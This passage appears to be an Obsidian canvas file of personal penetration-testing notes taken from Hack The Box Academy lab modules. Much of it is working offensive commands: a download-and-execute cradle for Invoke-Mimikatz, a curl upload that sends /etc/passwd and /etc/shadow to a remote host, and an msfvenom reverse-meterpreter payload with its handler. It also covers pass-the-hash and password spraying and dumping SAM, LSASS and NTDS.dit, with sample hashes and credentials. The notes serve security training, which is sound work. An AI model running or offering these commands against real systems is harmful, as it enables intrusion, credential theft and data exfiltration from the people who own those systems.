C:\\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\nOther methods: https://gist.github.com/HarmJ0y/bb48307ffa663256e239\n## SMB\n```bash\nsudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n```\n```powershell\nC:\\htb> net use n: \\\\192.168.220.133\\share /user:test test\nC:\\htb> copy n:\\nc.exe\n```\n## FTP\n```bash\nsudo python3 -m pyftpdlib --port 21\n```\n```powershell\nPS C:\\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n```\n```powershell\n# If no interactive shell\nC:\\htb> echo open 192.168.49.128 > ftpcommand.txt\nC:\\htb> echo USER anonymous >> ftpcommand.txt\nC:\\htb> echo binary >> ftpcommand.txt\nC:\\htb> echo GET file.txt >> ftpcommand.txt\nC:\\htb> echo bye >> ftpcommand.txt\nC:\\htb> ftp -v -n -s:ftpcommand.txt\nftp> open 192.168.49.128\nLog in with USER and PASS first.\nftp> USER anonymous\n\nftp> GET file.txt\nftp> bye\n\nC:\\htb>more file.txt\n```","x":7880,"y":-480,"width":1600,"height":1360},
		{"id":"b68922c0f87c70f7","type":"text","text":"\n# Linux\n```bash\n# Connect to the Target Webserver\nexec 3<>/dev/tcp/10.10.10.32/80\n\n# HTTP GET Request\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\n\n# Print the Response\ncat <&3\n\n# cURL upload\ncurl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n```\n## WebServers\n```bash\n# Python\npython3 -m http.server 8080\npython2.7 -m SimpleHTTPServer\n\n# PHP\nphp -S 0.0.0.0:8000\n\n# Ruby\nruby -run -ehttpd . -p8000\n```","x":7880,"y":920,"width":960,"height":652},
		{"id":"fd0fc7ae8ee8ced5","type":"text","text":"# Living of the Land\n([HTB Link](https://academy.hackthebox.com/module/24/section/1575))\n- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)\n- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)\nExtra win:\n- [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)\n-  Certutil (wget like, BUT `(AMSI) currently detects this as malicious Certutil usage`)\n\n","x":7880,"y":1593,"width":960,"height":267},
		{"id":"fb312b153866823a","type":"text","text":"# NetCat, NCat, nc (& bash)\n### Receiving & Listening\n```bash\n# Example using Original Netcat\nnc -l -p 8000 > file\n\n# Example using Ncat\nncat -l -p 8000 --recv-only > file\n\n```\n### Sending & Connecting\n```bash\n# Example using Original Netcat\nnc -q 0 192.168.49.128 8000 < file\n\n# Example using Ncat\nncat --send-only 192.168.49.128 8000 < file\n```\n### Sending & Listening\n```bash\n# Example using Original Netcat\nsudo nc -l -p 443 -q 0 < file\n\n# Example using Ncat\nsudo ncat -l -p 443 --send-only < file\n```\n### Receiving & Connecting\n```bash\ncat < /dev/tcp/192.168.49.128/443 > file\n```","x":8880,"y":941,"width":460,"height":860},
		{"id":"6efcf80abffc672d","type":"text","text":"# Credential Hunting\n### Lazagne [Link](https://github.com/AlessandroZ/LaZagne)\n```cmd\nC:\\> start lazagne.exe all\n```\n### findstr\n```cmd\nC:\\> findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n```\n\nHere are some other places we should keep in mind when credential hunting:\n- Passwords in Group Policy in the SYSVOL share\n- Passwords in scripts in the SYSVOL share\n- Password in scripts on IT shares\n- Passwords in web.config files on dev machines and IT shares\n- unattend.xml\n- Passwords in the AD user or computer description fields\n- KeePass databases --> pull hash, crack and get loads of access.\n- Found on user systems and shares\n- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)","x":4803,"y":720,"width":1197,"height":1400},
		{"id":"60b72260624a9cae","type":"text","text":"# Pass-the-Hash (PtH)\n##### Evil-winrm\n```bash\nevil-winrm -i <target>  -u Administrator -H \"64f12cddaa88057e06a81b54e73b949b\"\n```\n##### Impacket\n```bash\nimpacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453 \n```\nAlso:\n- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)\n- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)\n- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)\n##### Crackmapexec\n```bash\n# Password Spraying\ncrackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453\n# Command\ncrackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami\n```\n##### Rdp (with registry set)\n```bash\nxfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B\n```\n>`HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa` has to be set to 1\n```cmd\nreg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n```","x":4803,"y":2180,"width":1197,"height":880},
		{"id":"7d2ac99aa80b5182","type":"text","text":"# Proxying\n### Proxychain\n```bash\n# Config @ `/etc/proxychains.conf`\n# proxychains command arg1 arg2 ... # ex:\nproxychains curl http://SERVER_IP:PORT\n```\n### Nmap\n```bash\n$ nmap -h | grep -i prox\n\n  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies\n# Ex:\n$ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC\n```","x":6460,"y":-3040,"width":1100,"height":500},
		{"id":"f7a2cf293d03f065","type":"text","text":"### Port Forward from localhost with ssh\n```bash\nssh -L 1234:localhost:3306 <user>@<remote_host>                  ### <remote_host>:3306 will be accessable through <remote_host>'s lo interface on localhost:1234 ??? (Questionable description)\n```\n### Enabling Dynamic Port Forwarding with SSH (`SOCKS tunneling`)\n1. First we open the ssh SOCKS port via SSH\n```bash\nssh -D 9050 ubuntu@10.129.202.64                                 ### \n```\n2. After that we configure pivot to send trafic through the SOCKS port\n```bash\n$ tail -1 /etc/proxychains.conf\nsocks4 \t127.0.0.1 9050\n```\n3. Then we can use our tool (now `nmap`) to reach to the network behind the target\n```bash\nproxychains nmap -v -sn 172.16.5.1-200\n```\n\n> [!warning]\n> We can only perform `full TCP connect scan` over proxychains. \n> > [!Explanation]-\n> > The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results.\n##### msfconsole & xfreerdp\nAlso we can pass through proxychains the trafic of msfconsole and xfreerdp too:\n```bash\nproxychains msfconsole\n```\n\n```bash\nproxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123\n```\n\n\n![](https://academy.hackthebox.com/storage/modules/158/22.png)\n\n\n### Port Forward to another host with ssh (my research, not HTB)\n```bash\nssh -J user@gate user@target -L 8006:localhost:8006\nssh -J buduboti@100.101.48.27 root@192.168.1.12 -L 8006:localhost:8006\n```","x":2960,"y":-3080,"width":1060,"height":1880},
		{"id":"43b2b1a3d35ba6ab","type":"text","text":"### Remote/Reverse Port Forwarding with SSH\nIf we want a reverse shell, and the target host don't have route to our host (why would it have?), we can create a port forward on the pivot server via `SSH -R`:\n![](https://academy.hackthebox.com/storage/modules/158/33.png)\n\n1. First we create our payload to the windows target, which will connect to the pivot's 8080 port:\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080\n```\n2. We can now copy that payload to the pivot machine via scp and to the target machine via the HTTP python module in this example:\n```bash\n# scp from our host to the pivot\nscp backupscript.exe ubuntu@<ipAddressofTarget>:~/\n```\n```bash\n# start the http server on the pivot\npython3 -m http.server 8123\n```\n```powershell\n# download the payload from out pivot\nInvoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"\n```\n3. Start the listener on our host (using msf's multi/handler)\n```shell-session\nmsf6 > use exploit/multi/handler\n\n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https\npayload => windows/x64/meterpreter/reverse_https\nmsf6 exploit(multi/handler) > set lhost 0.0.0.0\nlhost => 0.0.0.0\nmsf6 exploit(multi/handler) > set lport 8000\nlport => 8000\nmsf6 exploit(multi/handler) > run\n\n[*] Started HTTPS reverse handler on https://0.0.0.0:8000\n```\n4. Start the SSH port forward, which will forward all trafic from the pivot's 8080 port to our msf's listener on 8000\nWe will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.\n```bash\nssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN\n```\n5. Finally we can execute the payload, see the logs on the pivot and hopefully get a shell in the msf.\n![](https://academy.hackthebox.com/storage/modules/158/44.png)","x":4040,"y":-3080,"width":1060,"height":1880},
		{"id":"c2782a70f887522a","type":"text","text":"# Credential hunting (Priv esc)\n\n|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|\n|---|---|---|---|\n|Configs|Logs|Cache|Browser stored credentials|\n|Databases|Command-line History|In-memory Processing||\n|Notes||||\n|Scripts||||\n|Source codes||||\n|Cronjobs||||\n|SSH Keys|\n## Files\n```bash\n# Config\nfor l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2>/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n# Credential hunt\nfor i in $(find / -name *.cnf 2>/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2>/dev/null | grep -v \"\\#\";done\n# Databases\nfor l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2>/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n# Notes\nfind /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n# Notes\nfor l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2>/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n# Cronjobs\ncat /etc/crontab\nls -la /etc/cron.*/\n# SSH\ngrep -rnw \"PRIVATE KEY\" /home/* 2>/dev/null | grep \":1\"\ngrep -rnw \"ssh-rsa\" /home/* 2>/dev/null | grep \":1\"\n```\n## Memory\n```bash\n# Mimikatz like mimipenguin\nsudo python3 mimipenguin.py\nsudo bash mimipenguin.sh\n```\n```bash\n# laZagne\nsudo python2.7 laZagne.py all\n```","x":3040,"y":-380,"width":1360,"height":1140},
		{"id":"7185c3c8cd5a69e9","type":"text","text":"## Attacking Active Directory & NTDS.dit\n### CrackMapExec (Dictionary Attack)\n```bash\ncrackmapexec smb <target> -u username -p /usr/share/wordlists/fasttrack.txt\n```\n### Capturing NTDS.dit\n```bash\nevil-winrm -i <target>  -u bwilliamson -p 'P@55w0rd!'\n```\n```powershell\n*Evil-WinRM* PS C:\\> net localgroup                        # Checking local group membership\n```\n```powershell\n*Evil-WinRM* PS C:\\> net user bwilliamson                  # Checking user account privileges (inc. Domain)\n```\n#### Creating Shadow Copy of C:\n```powershell\n*Evil-WinRM* PS C:\\> vssadmin CREATE SHADOW /For=C:\n[...]\nSuccessfully created shadow copy for 'C:\\'\n    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}\n    Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n```\n```powershell\n*Evil-WinRM* PS C:\\NTDS> cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n```\n```powershell\n*Evil-WinRM* PS C:\\NTDS> cmd.exe /c move C:\\NTDS\\NTDS.dit \\\\10.10.15.30\\CompData \n```\n#### Using cme to capture\n```bash\ncrackmapexec smb <target> -u bwilliamson -p P@55w0rd! --ntds\n```\n\nHashcat\n```bash\n# Cracking a single hash\nsudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt\n```","x":4803,"y":-380,"width":1197,"height":1040},
		{"id":"ce0c660316b88553","type":"text","text":"# Windows Local Password Attacks \n![[Auth_process1.webp]]\n## SAM\n> Local | Non-Domain joined (Domain joined also can be useful)\n\n| Registry Hive   | Description                                                                                                                                                |\n| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `hklm\\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |\n| `hklm\\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |\n| `hklm\\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |\n```cmd\nC:\\WINDOWS\\system32> reg.exe save hklm\\sam C:\\sam.save\nThe operation completed successfully.\nC:\\WINDOWS\\system32> reg.exe save hklm\\system C:\\system.save\nThe operation completed successfully.\nC:\\WINDOWS\\system32> reg.exe save hklm\\security C:\\security.save\nThe operation completed successfully.\n```\nAnd now you can transfer to the attack host via smb or other methods discussed in the File Transfer's Windows section \n```bash\nsudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/\n```\n```cmd\nC:\\> move sam.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\nC:\\> move security.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\nC:\\> move system.save \\\\10.10.15.16\\CompData\n        1 file(s) moved.\n```\nDumping the hashes:\n```bash\n# locate secretsdump\npython3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n\n[...]\nDumping local SAM hashes (uid:rid:lmhash:nthash)\nsam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::\n[...]\n```\nOperating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS. \nCopy NT hashes (`6f8c3f4d3869a10f3b4f0522f537fd33` now) to a file and hashcat it (`hashcat -m 1000`)\n#### Remote Dumping\n```bash\n### LSA Secrets Remotely\ncrackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa\n### SAM Secrets Remotely\ncrackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam\n```\n## LSASS\n> LSASS stores credentials that have active logon sessions on Windows systems\n\nUpon initial logon, LSASS will:\n- Cache credentials locally in memory\n- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)\n- Enforce security policies\n- Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)\n### Dumping LSASS Process Memory\n#### Task Manager Method (GUI)\n`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`\nOutput: `C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\\lsass.DMP`\n#### Rundll32.exe & Comsvcs.dll Method\n> Modern anti-virus tools recognize this method as malicious activity.\n```powershell\nPS C:\\Windows\\system32> Get-Process lsass                                # PID is Id\nPS C:\\Windows\\system32> rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump PID C:\\lsass.dmp full\n```\n### Extract Creds\n[Pypykatz](https://github.com/skelsec/pypykatz) (mimikatz python - linux alternative)\n```bash\n$ pypykatz lsa minidump ./lsass.dmp\n```\n[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package: Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes.\n`WDIGEST` is an older authentication protocol; usually not enabled, stores passwords in plain text; update to it: [HERE](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/)\nLSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos\n[DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) encrypts and decrypts data blobs on a per-user basis:\n\n| Applications                | Use of DPAPI                                                                                |\n| --------------------------- | ------------------------------------------------------------------------------------------- |\n| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |\n| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |\n| `Outlook`                   | Passwords for email accounts.                                                               |\n| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |\n| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |\nMimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user. \n","x":6060,"y":-380,"width":1197,"height":3180},
		{"id":"b4a3baa2269e2fc5","type":"text","text":"## Modules\n\nSyntax: `<No.> <type>/<os>/<service>/<name>`\n(ex: `794   exploit/windows/ftp/scriptftp_list`\n\n###### Search\n\n`search [key:value] <query>`\n(ex: `search type:exploit platform:windows cve:2021 rank:excellent microsoft`) # for keywords `help search`","x":1100,"y":300,"width":920,"height":280},
		{"id":"789e168f757be820","type":"text","text":"### Payloads\n\n`show payloads`  ; `grep meterpreter grep reverse_tcp show payloads`","x":1142,"y":651,"width":598,"height":109},
		{"id":"03adcb486fd6d5fb","type":"text","text":"### Target\n`show targets`","x":1657,"y":839,"width":166,"height":102},
		{"id":"1c15aa3ce04a7d77","type":"text","text":"# Generating Credentials\n### Username Anarchy (@tools)\n```bash\n./username-anarchy <V_Név> <K_Név> > file.txt\n```\n\n### CUPP (Common User Passwords Profiler)\n```bash\ncupp -i              # interactive \n```\n### Filtering out the generated passwords to match some password policy\n```bash\n#                     !!!    Check the username & password files (like --color=never should be set)    !!!   \ngrep -E '^.{6,}$' user.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > user-filtered.txt\n#        min 6 character   | min 1 UPPERCASE | min 1 lowercase |   min 1 number  | min 2 special from the list\n```\n","x":740,"y":1460,"width":1200,"height":500},
		{"id":"05a2fe6b11129865","type":"text","text":"# Hydra\n### Attack types\nTo list all services use: `hydra -h | grep \"Supported services\" | cut -d':' -f2 | tr ' ' \"\\n\" | column -e`\n\n In case of a `http[s]-{get|post}-form` if no error message appears, you can use the login button or form to distinguish success from failure: `\"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'\"`\n###### Example: \n```bash\nhydra -L usernames.txt -P passwords.txt IP -s PORT -f http-post-form \"/:username=^USER^&password=^PASS^:Invalid credentials\"\n```\n### Flags\n- `-C       : Combined credentials`\n- `-L, -l   : Usernames (file of one specified username)`\n- `-P, -p   : Passwords (file of one specified password)`\n- `-f       : Tells hydra to stop after the first successful login`\n- `-u       : Tries all users on each password, instead of trying all passwords on each users`\n- `-R       : Restore a previously aborted session. Requires a hydra.restore file was written`","x":740,"y":1980,"width":1180,"height":640},
		{"id":"3b7102a66f914c8c","type":"text","text":"### Venom\n\n###### Encoder\n`-e <encoder>`","x":1300,"y":810,"width":208,"height":161},
		{"id":"24c82b1d545aa72c","type":"text","text":"Curl: `curl -I http://${TARGET}`","x":376,"y":-1987,"width":364,"height":62},
		{"id":"d823a459af90cf18","type":"text","text":"Crawling with scrapy - ReconSpider.py","x":376,"y":-1804,"width":364,"height":60},
		{"id":"82ae3ce8b326348b","type":"text","text":"[Aquatone](https://github.com/buduboti/aquatone)","x":376,"y":-1864,"width":364,"height":60},
		{"id":"2d9ddc28c495e97d","type":"text","text":"# TODO:\n# - [ ] UDP SCAN BY NMAP SCRIPT !!!\n# - [ ] NMAP SCRIPT\n# - [ ] ITSHARE-script \n\thttp\n\tsmb\n\tetc\n ","x":992,"y":-1031,"width":1648,"height":971,"color":"1"},
		{"id":"4593133ee1af2c3d","type":"text","text":"WafW00f: `wafw00f -v https://$TARGET`","x":376,"y":-1925,"width":364,"height":61},
		{"id":"276de0fe293f93d5","x":267,"y":3395,"width":293,"height":105,"type":"text","text":"# Reverse Shells\n\nhttps://www.revshells.com/"},
		{"id":"1378f30770093bdd","x":3020,"y":3160,"width":313,"height":189,"type":"text","text":"# Hashtables\n### Online\n - [Crackstation](https://crackstation.net/)"}
	],
	"edges":[
		{"id":"b29cecb30a0b6c87","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"652687788106a5c8","toSide":"left"},
		{"id":"a533bffa5d17fdd6","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"a04df860f5774444","toSide":"left"},
		{"id":"5db45a437eb23e5c","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"5af52eedc0e2b307","toSide":"left"},
		{"id":"d0a65bd4d0745453","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"bde918b4f4706179","toSide":"left"},
		{"id":"52639e1e58d2740c","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"5678285ef03f5fda","toSide":"left"},
		{"id":"6645fd939a5b62de","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"ed11813fcbefe999","toSide":"left"},
		{"id":"50e58eaa843b4642","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"43c2a34c5cd5bba0","toSide":"left"},
		{"id":"88859eb47ef8381d","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"dd7be710f2ad7e91","toSide":"left"},
		{"id":"5ef3df5abdc64188","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"59556103dd3d44b9","toSide":"left"},
		{"id":"894407e4c328c331","fromNode":"4d6e35efc402f0ff","fromSide":"right","toNode":"e313ea9ede6969cd","toSide":"left"},
		{"id":"1e5b0e03e8d0d55d","fromNode":"653e1bf67d8e68f1","fromSide":"right","toNode":"a59131683939524b","toSide":"top"},
		{"id":"7b21b07ecdea69f8","fromNode":"1b754128ff1d96c2","fromSide":"right","toNode":"2e7e258a308ff3fb","toSide":"left"},
		{"id":"ad696d488977916f","fromNode":"2e7e258a308ff3fb","fromSide":"right","toNode":"a59131683939524b","toSide":"left"},
		{"id":"3d19c6f56fd5448b","fromNode":"4d48a248077eccbd","fromSide":"right","toNode":"24c82b1d545aa72c","toSide":"left"},
		{"id":"af0613c0e131d3b2","fromNode":"2e7e258a308ff3fb","fromSide":"bottom","toNode":"f3db437ecf434afd","toSide":"top"},
		{"id":"6e1d89d67174b3ab","fromNode":"f3db437ecf434afd","fromSide":"top","toNode":"2e7e258a308ff3fb","toSide":"bottom"},
		{"id":"2a6b39c19941a959","fromNode":"ce0c660316b88553","fromSide":"right","toNode":"5a38bc7b9fd49314","toSide":"left"}
	]
}